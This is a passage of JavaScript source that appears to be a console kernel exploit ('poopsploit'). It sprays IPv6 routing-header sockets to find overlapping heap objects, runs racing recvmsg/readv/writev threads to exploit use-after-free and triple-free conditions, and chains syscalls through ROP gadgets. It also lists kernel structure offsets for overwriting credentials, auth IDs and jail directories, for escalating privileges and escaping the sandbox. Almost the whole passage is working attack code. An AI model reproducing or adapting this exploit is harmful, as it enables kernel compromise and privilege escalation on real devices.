            "/" +
            (r.why || "?") +
            ", " +
            r.attempts +
            " attempts)",
        );

        await sysYield();
        await sysSleepMs(TWK.REPAIR_SLEEP_MS);
      }
      S.triplets[slot] = got;
      if (got < 0) {
        flushMark(
          "TRIPLET-REPAIR-FAILED",
          "slot=" +
            slot +
            "-tries=" +
            tries +
            "-why=" +
            ((last && last.why) || "?"),
        );

        return {
          ok: false,
          log,
          last,
          why: (last && last.why) || "",
          failedSlot: slot,
          triplets: S.triplets.slice(),
        };
      }
    }
    return {
      ok: tripletsValid(),
      log,
      last,
      why: (last && last.why) || "",
      failedSlot: -1,
      triplets: S.triplets.slice(),
    };
  }

  async function sysYield() {
    try {
      await sys(SYS_SCHED_YIELD);
    } catch (e) {}
  }

  let tsBuf = null;
  async function sysSleepMs(ms) {
    if (P.syscalls[SYS_NANOSLEEP] === undefined) {
      await new Promise((r) => setTimeout(r, ms));
      return "js-timer";
    }
    if (!tsBuf) tsBuf = arena(0x20, "timespec");
    w64(tsBuf.u8, 0, Math.floor(ms / 1000));
    w64(tsBuf.u8, 8, (ms % 1000) * 1000000);
    try {
      await sys(SYS_NANOSLEEP, tsBuf.base, 0);
      return "nanosleep";
    } catch (e) {
      return "threw";
    }
  }

  async function readFullHeader(idx) {
    needStub(SYS_GETSOCKOPT, "full-header read");
    const fd = S.fds[idx];
    if (fd === undefined)
      return { failed: true, errText: "no socket at index " + idx };

    const buf = arena(TWK.UCRED_SIZE, "fullhdr-buf");
    const lenp = arena(8, "fullhdr-optlen");
    for (let k = 0; k < TWK.UCRED_SIZE; ++k) buf.u8[k] = 0xee;
    w32(lenp.u8, 0, TWK.UCRED_SIZE);
    flushMark(
      "FULLHDR-PRE",
      "idx=" +
        idx +
        "-fd=" +
        fd +
        "-buf=0x" +
        buf.base.toString() +
        "-optlen-in=" +
        TWK.UCRED_SIZE +
        "-next=getsockopt",
    );
    const r = await sys(
      SYS_GETSOCKOPT,
      fd,
      K.IPPROTO_IPV6,
      K.IPV6_RTHDR,
      buf.base,
      lenp.base,
    );
    if (r.failed) return { failed: true, errText: r.errText, r: r };
    const outLen = r32(lenp.u8, 0) >>> 0;
    const tag = r32(buf.u8, 4) >>> 0;
    const want = (TWK.RTHDR_TAG | idx) >>> 0;
    flushMark(
      "FULLHDR",
      "idx=" +
        idx +
        "-ret=" +
        r.s32 +
        "-optlen-out=" +
        outLen +
        "-tag=0x" +
        tag.toString(16) +
        "-want=0x" +
        want.toString(16),
    );
    return {
      failed: false,
      outLen: outLen,
      tag: tag,
      tagOk: tag === want,
      r: r,
    };
  }

  async function openSockets(n) {
    needStub(SYS_SOCKET, "AF_INET6 spray");
    needStub(SYS_CLOSE, "socket close");
    needStub(SYS_SETSOCKOPT, "set_rthdr/free_rthdr");
    needStub(SYS_GETSOCKOPT, "get_rthdr");
    needGadget("pop rdi", "write_result4");
    needGadget("mov [rdi], eax", "write_result4");
    needGadget("ret", "fcall alignment slot");

    flushMark(
      "SOCKETS-PRE",
      "want=" + n + "-af=" + K.AF_INET6 + "-type=" + K.SOCK_STREAM,
    );

    const fds = (S.fds = []);
    S.n = 0;
    let stoppedAt = "",
      firstErr = "";
    for (let i = 0; i < n; ++i) {
      const r = await sys(SYS_SOCKET, K.AF_INET6, K.SOCK_STREAM, 0);
      if (r.failed) {
        stoppedAt = "socket " + i + " failed (" + r.errText + ")";
        firstErr = r.errText;
        break;
      }
      const fd = r.s32;
      if (fd < 0 || fd > 0x10000) {
        stoppedAt = "socket " + i + " implausible fd " + fd;
        break;
      }
      fds.push(fd);
      S.n = fds.length;
      track(fd);
    }

    const initFailed = [];
    if (fds.length) {
      armPadIfNeeded(1, fds.length);
      try {
        for (let i = 0; i < fds.length; ++i)
          emitCall(
            SYS_SETSOCKOPT,
            retSetPtr(0, i),
            fds[i],
            K.IPPROTO_IPV6,
            K.IPV6_RTHDR,
            0,
            0,
          );
      } catch (err) {
        chain.clear();
        throw err;
      }
      await runChain();
      S.chainRuns++;
      for (let i = 0; i < fds.length; ++i)
        if (retSetOf(0, i) !== 0 && initFailed.length < 24)
          initFailed.push(i + "=" + retSetOf(0, i));
    }

    const dupCount = fds.length - new Set(fds).size;
    if (dupCount)
      flushMark(
        "SOCKETS-DUPLICATE",
        "dups=" + dupCount + "-of-" + fds.length + "-bank-unusable",
      );
    S.dupCount = dupCount;
    flushMark(
      "SOCKETS",
      "opened=" +
        fds.length +
        "-of-" +
        n +
        "-first=" +
        (fds[0] === undefined ? -1 : fds[0]) +
        "-last=" +
        (fds.length ? fds[fds.length - 1] : -1) +
        "-dups=" +
        dupCount +
        "-initFreeFail=" +
        (initFailed.length || 0) +
        (initFailed.length ? "-sample=" + initFailed[0] : "") +
        (stoppedAt ? "-stopped=" + stoppedAt.replace(/[^\w.=-]+/g, "_") : ""),
    );
    return {
      fds: fds.slice(),
      opened: fds.length,
      stoppedAt,
      firstErr,
      initFailed,
    };
  }

  function armPadIfNeeded(batch, n) {
    if (!S.pad || S.pad.n !== n || S.pad.batch < batch) allocPad(batch, n);
    armPad(batch, n);
  }

  let teardownRun = null;
  let teardownResult = null;
  async function teardown(opts) {
    if (teardownResult) {
      flushMark(
        "TEARDOWN-REENTRY",
        "already-completed-freed=" +
          teardownResult.freed +
          "-closed=" +
          teardownResult.closed,
      );
      return Object.assign({}, teardownResult, { reentry: true });
    }
    if (teardownRun) {
      flushMark("TEARDOWN-REENTRY", "concurrent-call-joined");
      return teardownRun;
    }
    teardownRun = doTeardown(opts || {});
    try {
      const r = await teardownRun;
      teardownResult = r;
      return r;
    } catch (err) {
      teardownRun = null;
      throw err;
    }
  }

  async function doTeardown(opts) {
    const skip = (opts && opts.skipIndices) || [];
    if (S.corrupt) {
      flushMark("TEARDOWN-REFUSED", S.corrupt.slice(0, 150));
      return {
        refused: true,
        reason: S.corrupt,
        freed: 0,
        closed: 0,
        total: S.n,
        leftOpen: S.n,
        freeFailed: [],
        closeFailed: [],
        skipped: [],
      };
    }
    const n = S.n;
    if (!n)
      return {
        freed: 0,
        closed: 0,
        total: 0,
        freeFailed: [],
        closeFailed: [],
        skipped: [],
      };
    flushMark(
      "TEARDOWN-PRE",
      "sockets=" +
        n +
        "-skip=" +
        (skip.join(".") || "none") +
        "-next=free_rthdr-then-close",
    );

    if (chain.count !== chain.initial_count + 3) {
      flushMark(
        "TEARDOWN-CHAIN-DIRTY",
        "count=" + chain.count + "-clearing-before-teardown",
      );
      chain.clear();
    }
    const doing = [];
    for (let i = 0; i < n; ++i) if (skip.indexOf(i) < 0) doing.push(i);
    const skipped = skip.slice();
    const target = doing.length;
    if (!target) {
      flushMark("TEARDOWN", "all-exempt-skip=" + skipped.join("."));
      return {
        freed: 0,
        closed: 0,
        total: 0,
        leftOpen: n,
        freeFailed: [],
        closeFailed: [],
        skipped,
      };
    }

    armPadIfNeeded(1, n);
    for (const i of doing)
      emitCall(
        SYS_SETSOCKOPT,
        retSetPtr(0, i),
        S.fds[i],
        K.IPPROTO_IPV6,
        K.IPV6_RTHDR,
        0,
        0,
      );
    await runChain();
    S.chainRuns++;
    const freeFailed = [];
    for (const i of doing)
      if (retSetOf(0, i) !== 0) freeFailed.push(i + "=" + retSetOf(0, i));

    armPad(1, n);
    for (const i of doing) emitCall(SYS_CLOSE, retSetPtr(0, i), S.fds[i]);
    await runChain();
    S.chainRuns++;
    const closeFailed = [];
    const kept = [];
    for (let i = 0; i < n; ++i) {
      if (skip.indexOf(i) >= 0) {
        kept.push(S.fds[i]);
        continue;
      }
      if (retSetOf(0, i) !== 0) {
        closeFailed.push(i + "=" + retSetOf(0, i));

        kept.push(S.fds[i]);
      } else {
        untrack(S.fds[i]);
      }
    }
    flushMark(
      "TEARDOWN",
      "freed=" +
        (target - freeFailed.length) +
        "of" +
        target +
        "-closed=" +
        (target - closeFailed.length) +
        "of" +
        target +
        "-exempt=" +
        (skipped.join(".") || "none") +
        "-freeFail=" +
        (freeFailed.join(".") || "none") +
        "-closeFail=" +
        (closeFailed.join(".") || "none"),
    );
    S.fds = kept;
    S.n = kept.length;
    return {
      freed: target - freeFailed.length,
      closed: target - closeFailed.length,
      total: target,
      leftOpen: kept.length,
      freeFailed,
      closeFailed,
      skipped,
    };
  }

  return {
    TWK,
    SHAPE,
    S,
    buildSprayBank,
    setSprayTag,
    sprayTagOf,
    sprayPtr,
    allocPad,
    armPad,
    armPadIfNeeded,
    retSetOf,
    retGetOf,
    optlenOf,
    leakTagOf,
    leakWord0Of,
    emitAttempt,
    emitCall,
    runTwinBatch,
    scanBatch,
    isTwin,
    chainCapacity,
    measureShape,
    rthdrShape,
    findTwins,
    findTriplet,
    tripletsValid,
    repairTriplets,
    clearCorrupt,
    burn,
    isBurned,

    setScanMarksQuiet,
    openSockets,
    teardown,
    arena,
    readFullHeader,
    poison,
    isForged,
    bankForgeries,
    canonicalTag,
    get corrupt() {
      return S.corrupt;
    },
    get teardownDone() {
      return teardownResult !== null;
    },
    get fds() {
      return S.fds.slice();
    },
    get n() {
      return S.n;
    },
    get triplets() {
      return S.triplets;
    },
    get twins() {
      return S.twins;
    },
  };
}

export const PSYS = {
  READ: 0x3,
  WRITE: 0x4,
  OPEN: 0x5,
  CLOSE: 0x6,
  GETPID: 0x14,
  SETUID: 0x17,
  GETUID: 0x18,
  RECVMSG: 0x1b,
  DUP: 0x29,
  FCNTL: 0x5c,
  SOCKET: 0x61,
  NETCONTROL: 0x63,
  SETSOCKOPT: 0x69,
  GETSOCKOPT: 0x76,
  READV: 0x78,
  WRITEV: 0x79,
  SOCKETPAIR: 0x87,
  KQUEUEEX: 0x8d,
  GETRLIMIT: 0xc2,
  SETRLIMIT: 0xc3,
  NANOSLEEP: 0xf0,
  SCHED_YIELD: 0x14b,
  KQUEUE: 0x16a,
  UMTX_OP: 0x1c6,
  THR_NEW: 0x1c7,
  THR_EXIT: 0x1af,
  RTPRIO_THREAD: 0x1d2,
  CPUSET_GETAFFINITY: 0x1e7,
  CPUSET_SETAFFINITY: 0x1e8,
  MMAP: 0x1dd,
  MUNMAP: 0x49,
  JITSHM_CREATE: 0x215,
  JITSHM_ALIAS: 0x216,
  DYNLIB_DLSYM: 0x24f,
  IOCTL: 0x36,
  PIPE2: 0x2af,
};

export const PK = {
  UCRED_SIZE: K.UCRED_SIZE,

  MSG_IOV_NUM: K.MSG_IOV_NUM,

  UIO_IOV_COUNT: K.UIO_IOV_NUM,
  IOV_SIZE: K.IOV_SIZE,

  UIO_SYSSPACE: 1,
  SIZEOF_UIO: 0x30,

  IOV_THREAD_NUM: TK.IOV_THREAD_NUM,
  UIO_THREAD_NUM: TK.UIO_THREAD_NUM,

  TRIPLEFREE_ATTEMPTS: 96,

  NETCTRL_ATTEMPTS: 8,

  MAX_ROUNDS_TWIN: TWK.MAX_ROUNDS_TWIN,

  MAX_ROUNDS_TRIPLET: TWK.MAX_ROUNDS_TRIPLET,

  FIND_TRIPLET_FAST: TWK.FIND_TRIPLET_FAST,

  IOV_FLUSH_ROUNDS: 32,

  STAGE1_REPAIR_ATTEMPTS: 64,

  STAGE1_REPAIR_TRIES: 12,

  RECLAIM_ROUNDS: 2000,

  KSLOW_ATTEMPTS: 3,

  KQ_ROUNDS: 5000,

  KQ_BATCH: 8,

  STAGE2_ATTEMPTS: 5,

  NET_CONTROL_NETEVENT_SET_QUEUE: 0x20000003,
  NET_CONTROL_NETEVENT_CLEAR_QUEUE: 0x20000007,

  LEAK_SYSCALLS_LO: 1,
  LEAK_SYSCALLS_HI: 1,

  LEAK_SYSCALLS_FINAL: 0xfed,
  LEAK_FD_MAX: 8192,
  LEAK_UNROLL: 512,
  LEAK_CORES: 4,

  POC_ARG_HI: 0x8000,
  POC_ARG_LO: 0,
  EXIT_MARK: 0xdead,

  R_ESTIMATE: 69 + 12 + 1 + 1,
  FD_BUDGET_MARGIN: 96,
  FREE_FDS_CAP: 2048,

  FREE_FD_PATHS: [
    "/dev/null",
    "/dev/",
    "/",
    "/app0/",
    "/dev/urandom",
    "/dev/notification0",
    "/dev/gc",
  ],

  OFF: {
    KQ_FDP: 0xa8,

    FILEDESC_OFILES: 0x00,

    FDESCENTTBL_HDR: 0x08,

    FILEDESCENT_SIZE: 0x30,

    FILE_F_DATA: 0x00,

    UIO_IOV: 0x00,
    UIO_IOVCNT: 0x08,
    UIO_OFFSET: 0x10,
    UIO_RESID: 0x18,
    UIO_SEGFLG: 0x20,
    UIO_RW: 0x24,
    UIO_TD: 0x28,

    FILE_F_COUNT: 0x28,

    PIPE_SIGIO: 0xd8,

    SIGIO_PROC: 0x00,

    PROC_PID: 0xbc,


    PROC_UCRED: 0x40,

    UCRED_CR_UID: 0x04,

    SOCKET_SO_PCB: 0x18,

    INPCB_PKTOPTS: 0x120,

    PROC_FD: 0x48,

    UCRED_CR_RUID: 0x08,
    UCRED_CR_SVUID: 0x0c,
    UCRED_CR_NGROUPS: 0x10,
    UCRED_CR_RGID: 0x14,
    UCRED_CR_SVGID: 0x18,

    UCRED_CR_SCEAUTHID: 0x58,
    UCRED_CR_SCECAPS0: 0x60,
    UCRED_CR_SCECAPS1: 0x68,

    UCRED_ATTRS_QWORD: 0x80,

    PROC_DYNLIB: 0x3e8,

    DYNLIB_SC_START: 0xf0,
    DYNLIB_SC_END: 0xf8,

    FD_CDIR: 0x08,

    FD_RDIR: 0x10,
    FD_JDIR: 0x18,

    IP6PO_RTHDR: 0x70,
  },

  PAGE: 0x4000,
  PROT_RWX: 0x7,
  MAP_SHARED: 0x1,

  PROT_RW: 0x3,
  MAP_ANON_PRIVATE: 0x1002,

  LIBKERNEL_HANDLE: 0x2001,

  LIBC_HANDLE: 0x2,



  // Needed only by the kit-only target_id exception below. poopsploit finds allproc by
  // walking from curproc, so these give kdata_base = allproc - KERNEL_ALLPROC.
  KERNEL_ALLPROC:
    typeof OFFSET_KERNEL_ALLPROC === "number" ? OFFSET_KERNEL_ALLPROC : -1,
  KERNEL_SECURITY_FLAGS:
    typeof OFFSET_KERNEL_SECURITY_FLAGS === "number"
      ? OFFSET_KERNEL_SECURITY_FLAGS
      : -1,

  LK_PTHREAD_CREATE_NAME_NP:
    typeof OFFSET_lk_pthread_create_name_np === "number"
      ? OFFSET_lk_pthread_create_name_np
      : -1,
  LK_PTHREAD_JOIN:
    typeof OFFSET_lk_pthread_join === "number" ? OFFSET_lk_pthread_join : -1,
  LK_SCE_PTHREAD_CREATE:
    typeof OFFSET_lk_scePthreadCreate === "number"
      ? OFFSET_lk_scePthreadCreate
      : -1,
  LK_SCE_PTHREAD_JOIN:
    typeof OFFSET_lk_scePthreadJoin === "number" ? OFFSET_lk_scePthreadJoin : -1,
  LK_SCE_PTHREAD_ATTR_INIT:
    typeof OFFSET_lk_scePthreadAttrInit === "number"
      ? OFFSET_lk_scePthreadAttrInit
      : -1,
  LK_SCE_PTHREAD_ATTR_SETSTACKSIZE:
    typeof OFFSET_lk_scePthreadAttrSetstacksize === "number"
      ? OFFSET_lk_scePthreadAttrSetstacksize
      : -1,
  LK_SCE_PTHREAD_ATTR_SETDETACHSTATE:
    typeof OFFSET_lk_scePthreadAttrSetdetachstate === "number"
      ? OFFSET_lk_scePthreadAttrSetdetachstate
      : -1,
  LK_SCE_PTHREAD_ATTR_DESTROY:
    typeof OFFSET_lk_scePthreadAttrDestroy === "number"
      ? OFFSET_lk_scePthreadAttrDestroy
      : -1,
  LK_NOTIFY: typeof OFFSET_lk_sceKernelSendNotificationRequest === "number"
    ? OFFSET_lk_sceKernelSendNotificationRequest : -1,
  LK_SYSCTLBYNAME: typeof OFFSET_lk_sysctlbyname === "number"
    ? OFFSET_lk_sysctlbyname : -1,
  LK_PTHREAD_CREATE: typeof OFFSET_lk_pthread_create === "number"
    ? OFFSET_lk_pthread_create : -1,
  LK_GETPID: typeof OFFSET_lk_getpid === "number" ? OFFSET_lk_getpid : -1,
  LC_MALLOC: typeof OFFSET_lc_malloc === "number" ? OFFSET_lc_malloc : -1,
  LC_FREE: typeof OFFSET_lc_free === "number" ? OFFSET_lc_free : -1,
  LC_MEMCPY: typeof OFFSET_lc_memcpy === "number" ? OFFSET_lc_memcpy : -1,
  LC_MEMSET: typeof OFFSET_lc_memset === "number" ? OFFSET_lc_memset : -1,
  LC_STRCMP: typeof OFFSET_lc_strcmp === "number" ? OFFSET_lc_strcmp : -1,
  LC_MEMCMP: typeof OFFSET_lc_memcmp === "number" ? OFFSET_lc_memcmp : -1,
  LC_VSNPRINTF: typeof OFFSET_lc_vsnprintf === "number"
    ? OFFSET_lc_vsnprintf : -1,


  STAGE5_SPAWN: "pthread",

  STAGE5_THR_STACK: 0x8000,
  STAGE5_THR_TLS: 0x40,

  STAGE5_WAIT_TICKS: 24,
  STAGE5_WAIT_MS: 250,

  PIPEBUF_SIZE: 0x18,

  PIPE_PAGE_SIZE: 0x4000,

  F_SETOWN: 6,

  FIOSETOWN: 0x8004667c,

  SYSTEM_AUTHID_LO: 0x00010003,
  SYSTEM_AUTHID_HI: 0x48000000,


  SYSCORE_AUTHID_LO: 0x00000007,
  SYSCORE_AUTHID_HI: 0x48000000,

  KERNEL_PID: 0,

  INIT_WALK_MAX: 500,

  KREAD_RETRIES: 3,

  FIONREAD: 0x4004667f,

  KQ_SIGNATURE: 0x1430000,

  KQ_MIN_OUTLEN: 0xb0,

  SIGNAL_DEADLINE_MS: 5000,
  WAIT_DEADLINE_MS: 15000,
  EXIT_DEADLINE_MS: 15000,
  READY_DEADLINE_MS: 8000,

  SETTLE_AFTER_BANK_MS: 500,

  ATTEMPT_GAP_MS: 10,
  SUCCESS_SETTLE_MS: 500,

  STAGE2_SLEEP_SHORT_MS: 100,
  STAGE2_SLEEP_MS: 500,
};

const M1LO = 0xffffffff,
  M1HI = 0xffffffff;

export function isKernelPtr(v) {
  return v !== null && v !== undefined && v.hi >>> 16 === 0xffff;
}

export function isAligned8(v) {
  return v !== null && (v.low & 7) === 0;
}
export function isZero64(v) {
  return v !== null && v.low === 0 && v.hi === 0;
}
export function hx(v) {
  if (v === null || v === undefined) return "null";
  return (
    "0x" +
    (v.hi >>> 0).toString(16) +
    (v.low >>> 0).toString(16).padStart(8, "0")
  );
}

export function makePoopsEngine(X) {
  const {
    P,
    chain,
    i64,
    sys,
    runChain,
    mem,
    flushMark,
    queueEvent,
    sleep,
    note,
    track,
    untrack,
    state,
    driver,
    cfg,
    latch,
  } = X;

  const markStats =
    typeof X.markStats === "function"
      ? X.markStats
      : () => ({ queued: -1, blocked: -1 });

  const haveMarkStats = typeof X.markStats === "function";

  const flushQueueSoft =
    typeof X.flushQueue === "function"
      ? () => {
          try {
            X.flushQueue(false);
          } catch {}
        }
      : () => {};

  const setRaceMode =
    typeof X.setRaceMode === "function"
      ? (on) => {
          try {
            return !!X.setRaceMode(on);
          } catch {
            return false;
          }
        }
      : () => false;

  const TW = makeTwinEngine(X);
  const H = makeHarness(X);

  const r64 = (u8, o) => i64(r32(u8, o) >>> 0, r32(u8, o + 4) >>> 0);

  const S = {
    triggered: "",
    triggerFamily: "none",

    setuidCalls: 0,
    rlimitRaised: false,

    iovSockA: -1,
    iovSockB: -1,
    uioSockA: -1,
    uioSockB: -1,
    masterRfd: -1,
    masterWfd: -1,
    victimRfd: -1,
    victimWfd: -1,
    uafSock: -1,
    uafClosed: false,

    uafSocks: [],
    freeFds: [],
    freeFdIdx: 0,
    freeFdPath: "",
    fdBudget: -1,

    crRefWrapped: false,
    burnMode: "",
    burnPlan: null,
    kqOpen: [],
    burnPipes: [],

    iovGroup: null,
    uioReadGroup: null,
    uioWriteGroup: null,
    burnThreads: [],

    doNotClose: new Set(),

    groupsStillLive: [],

    buf: null,

    procFiledesc: null,
    fdOfiles: null,
    nfiles: -1,
    masterFp: null,
    victimFp: null,
    curproc: null,

    aliasesRepaired: false,
    jailbroken: false,
    dlsymEnabled: false,
    masterPipeData: null,
    victimPipeData: null,
    leakedIovFirst: null,

    crfrees: 0,
    kreadCalls: 0,
    kreadOk: 0,
    kqueuesOpened: 0,
    kqueuesClosed: 0,
    attemptsRun: 0,
    attemptReached: "",
    kqueueexIssued: 0,

    kernelWrites: 0,
  };

  function needStub(num, why) {
    if (Object.prototype.hasOwnProperty.call(BANNED, num))
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " is BANNED -- " +
          BANNED[num],
      );
    if (P.syscalls[num] === undefined)
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile: " +
          why,
      );
    return P.syscalls[num];
  }
  function emit(num, retPtr, a1, a2, a3, a4, a5) {
    needStub(num, "unrolled chain emit");
    chain.fcall(P.syscalls[num], a1, a2, a3, a4, a5);
    chain.write_result4(retPtr);
  }

  function emitCallAddr(addr, retPtr, a1, a2, a3, a4, a5) {
    chain.fcall(addr, a1, a2, a3, a4, a5);
    chain.write_result4(retPtr);
  }
  function assertFresh(where) {
    if (chain.count !== chain.initial_count + 3)
      throw new Error(
        where +
          ": chain not fresh (count=" +
          chain.count +
          ", expected " +
          (chain.initial_count + 3) +
          ")",
      );
  }

  async function runBuilt(where, build) {
    assertFresh(where);
    try {
      build();
    } catch (err) {
      chain.clear();
      throw err;
    }
    await runChain();
  }

  function alloc(nbytes, label) {
    return TW.arena(nbytes, label);
  }

  function buildBuffers() {
    const b = {};

    b.iovecs = alloc(PK.MSG_IOV_NUM * PK.IOV_SIZE, "recvmsg-iovecs-368");
    w64(b.iovecs.u8, 0x00, 1);
    w64(b.iovecs.u8, 0x08, 1);

    b.msghdr = alloc(0x38, "recvmsg-hdr");
    w64(b.msghdr.u8, 0x10, b.iovecs.base);
    w32(b.msghdr.u8, 0x18, PK.MSG_IOV_NUM);

    b.uioReadBuf = alloc(64, "uio-read-buf");
    for (let i = 0; i < 64; i += 8)
      w64(b.uioReadBuf.u8, i, i64(0x41414141, 0x41414141));
    b.uioWriteBuf = alloc(64, "uio-write-buf");

    b.uioIovRead = alloc(PK.UIO_IOV_COUNT * PK.IOV_SIZE, "uio-iov-read-320");
    w64(b.uioIovRead.u8, 0x00, b.uioReadBuf.base);
    w64(b.uioIovRead.u8, 0x08, 8);
    b.uioIovWrite = alloc(PK.UIO_IOV_COUNT * PK.IOV_SIZE, "uio-iov-write-320");
    w64(b.uioIovWrite.u8, 0x00, b.uioWriteBuf.base);
    w64(b.uioIovWrite.u8, 0x08, 8);

    b.kreadResult = [];
    for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
      b.kreadResult.push(alloc(64, "kread-result-" + i));

    b.sndbuf = alloc(4, "so-sndbuf-cell");
    b.fionread = alloc(4, "fionread-cell");

    b.pipebuf = alloc(PK.PIPEBUF_SIZE, "stage3-pipebuf-0x18");
    b.rwScratch = alloc(64, "stage3-rw-scratch");
    b.scratchBig = alloc(0x4000, "scratch-big-16k");
    b.dummyByte = alloc(8, "dummy-byte");
    b.lenOut = alloc(4, "getsockopt-optlen-inout");
    b.readback = alloc(PK.UCRED_SIZE, "rthdr-readback-360");

    b.retCells = 512;
    b.ret = alloc(b.retCells * 4, "ret-cells-512");

    b.setBuf = alloc(8, "netcontrol-set-buf");
    b.clrBuf = alloc(8, "netcontrol-clear-buf");

    b.rlimit = alloc(16, "rlimit");

    b.sv = alloc(8, "socketpair-out");
    b.pipefd = alloc(8, "pipe2-out");

    b.ts = alloc(0x10, "timespec");

    S.buf = b;
    return b;
  }

  function retPtr(i) {
    if (i < 0 || i >= S.buf.retCells)
      throw new Error(
        "retPtr(" +
          i +
          ") outside the " +
          S.buf.retCells +
          "-cell return arena",
      );
    return S.buf.ret.base.add32(i * 4);
  }
  const retOf = (i) => r32(S.buf.ret.u8, i * 4) | 0;
  function armRet(n) {
    if (n > S.buf.retCells)
      throw new Error("armRet(" + n + ") exceeds the return arena");
    for (let i = 0; i < n; ++i) w32(S.buf.ret.u8, i * 4, 0x7fffffff);
  }

  async function yieldN(n) {
    await runBuilt("yieldN", () => {
      armRet(n);
      for (let i = 0; i < n; ++i) emit(PSYS.SCHED_YIELD, retPtr(i));
    });
  }

  async function sleepK(ms) {
    if (P.syscalls[PSYS.NANOSLEEP] === undefined) {
      await sleep(ms);
      return;
    }
    w64(S.buf.ts.u8, 0, Math.floor(ms / 1000));
    w64(S.buf.ts.u8, 8, (ms % 1000) * 1000000);
    try {
      await sys(PSYS.NANOSLEEP, S.buf.ts.base, 0);
    } catch (e) {
      await sleep(ms);
    }
  }

  async function socketpairUnix(label) {
    w32(S.buf.sv.u8, 0, 0);
    w32(S.buf.sv.u8, 4, 0);
    flushMark("SOCKETPAIR-PRE", label + "-out=0x" + S.buf.sv.base.toString());
    const r = await sys(
      PSYS.SOCKETPAIR,
      K.AF_UNIX,
      K.SOCK_STREAM,
      0,
      S.buf.sv.base,
    );
    if (r.failed)
      throw new Error("socketpair(" + label + ") failed: " + r.errText);
    const a = r32(S.buf.sv.u8, 0) | 0,
      b = r32(S.buf.sv.u8, 4) | 0;
    if (a < 0 || b < 0 || a > 0x10000 || b > 0x10000)
      throw new Error(
        "socketpair(" + label + ") implausible fds " + a + "," + b,
      );
    track(a);
    track(b);
    flushMark("SOCKETPAIR", label + "-a=" + a + "-b=" + b);
    return [a, b];
  }

  async function pipe2Nonblock(label) {
    w32(S.buf.pipefd.u8, 0, 0);
    w32(S.buf.pipefd.u8, 4, 0);
    flushMark(
      "PIPE2-PRE",
      label + "-out=0x" + S.buf.pipefd.base.toString() + "-flags=O_NONBLOCK",
    );
    const r = await sys(PSYS.PIPE2, S.buf.pipefd.base, K.O_NONBLOCK);
    if (r.failed) throw new Error("pipe2(" + label + ") failed: " + r.errText);
    const a = r32(S.buf.pipefd.u8, 0) | 0,
      b = r32(S.buf.pipefd.u8, 4) | 0;
    if (a < 0 || b < 0)
      throw new Error("pipe2(" + label + ") gave " + a + "," + b);
    track(a);
    track(b);
    flushMark("PIPE2", label + "-r=" + a + "-w=" + b);
    return [a, b];
  }

  const RACER_FIELDS = (n) => [
    ["cmd", 1],
    ["awake", n],
    ["finished", n],
    ["status", n],
    ["cpu", n],
    ["pinret", n],
    ["prioret", n],
    ["lookupret", n],
    ["affret", n],
    ["waitret", n],
    ["workret", n],
    ["spawnret", n],
  ];

  async function makeRacerGroup(name, n, core, sysnum, fdGetter, iovPtr, cnt) {
    const sync = H.newSync(RACER_FIELDS(n));
    const gates = await H.newWakeGates(n, name);

    for (const gt of gates) {
      track(gt.rfd);
      track(gt.wfd);
    }
    const threads = [];
    for (let i = 0; i < n; ++i) {
      const wid = i;
      threads.push(
        H.buildRacer(sync, wid, {
          name: name + wid,
          core,
          prio: TK.POOPS_RTPRIO,
          wake: gates[i],
          work(t) {
            t.self_healing_syscall(sysnum, fdGetter(), iovPtr, cnt);
            t.write_result4(sync.ptr("workret", wid));
          },
        }),
      );
    }
    const g = H.newGroup(name, threads, sync, {
      signalDeadline: PK.SIGNAL_DEADLINE_MS,
      exitDeadline: PK.EXIT_DEADLINE_MS,
    });
    g.jbCore = core;
    g.jbGates = gates;
    return g;
  }

  async function setupRacerGroups(core) {
    needStub(PSYS.RECVMSG, "iov racers");
    needStub(PSYS.WRITEV, "uio read racers");
    needStub(PSYS.READV, "uio write racers");
    needStub(PSYS.THR_NEW, "racer spawn");
    needStub(PSYS.PIPE2, "racer wake gates (0x2AF)");
    const b = S.buf;
    S.iovGroup = await makeRacerGroup(
      "iov",
      PK.IOV_THREAD_NUM,
      core,
      PSYS.RECVMSG,
      () => S.iovSockA,
      b.msghdr.base,
      0,
    );
    S.uioReadGroup = await makeRacerGroup(
      "uioR",
      PK.UIO_THREAD_NUM,
      core,
      PSYS.WRITEV,
      () => S.uioSockB,
      b.uioIovRead.base,
      PK.UIO_IOV_COUNT,
    );
    S.uioWriteGroup = await makeRacerGroup(
      "uioW",
      PK.UIO_THREAD_NUM,
      core,
      PSYS.READV,
      () => S.uioSockA,
      b.uioIovWrite.base,
      PK.UIO_IOV_COUNT,
    );
    return [S.iovGroup, S.uioReadGroup, S.uioWriteGroup];
  }

  async function spawnRacers(core) {
    const groups = [S.iovGroup, S.uioReadGroup, S.uioWriteGroup];
    const out = [];
    for (const g of groups) {
      const sp = await H.spawnGroup(g);
      out.push({ name: g.name, ms: sp.ms, live: g.spawned.length });
      for (const t of g.spawned) {
        const ms = await H.awaitStatus(
          g.S,
          t.jbWid,
          TK.ST_READY,
          PK.READY_DEADLINE_MS,
          "poops-ready-" + g.name,
        );
        if (ms < 0)
          throw new Error(
            g.name +
              "[" +
              t.jbWid +
              "] never reached " +
              "READY (status=" +
              g.S.get("status", t.jbWid) +
              ")",
          );
      }
      const problem = H.groupPrologueProblem(g, core, TK.POOPS_RTPRIO);
      if (problem) throw new Error("racer prologue check failed -- " + problem);
    }
    return out;
  }

  async function flushIovWorkers(rounds, why) {
    const g = S.iovGroup;
    const b = S.buf;
    let firstRecvmsgRet = null;
    let blockedAfterSignal = -1;
    let awakeAfterSignal = -1;
    needStub(PSYS.SCHED_YIELD, "flush loop yield (poops.c:705, ts:1380)");
    needStub(PSYS.WRITE, "one-byte wakes and release byte");

    const wasQuiet = H.setSignalMarksQuiet(true);
    try {
      for (let k = 0; k < rounds; ++k) {
        const wake = H.armSignal(g, (why || "flush") + ":" + k);

        const probeRound = k === 0;
        await runBuilt("flush-wake", () => {
          armRet(wake.length + 2);
          let c = 0;
          for (const w of wake) emit(PSYS.WRITE, retPtr(c++), w.fd, w.buf, 1);
          emit(PSYS.SCHED_YIELD, retPtr(c++));
          if (!probeRound)
            emit(PSYS.WRITE, retPtr(c++), S.iovSockB, b.scratchBig.base, 1);
        });

        for (let i = 0; i < wake.length; ++i)
          if (retOf(i) !== 1) {
            flushMark(
              "IOV-WAKE-FAILED",
              "round=" +
                k +
                "-wid=" +
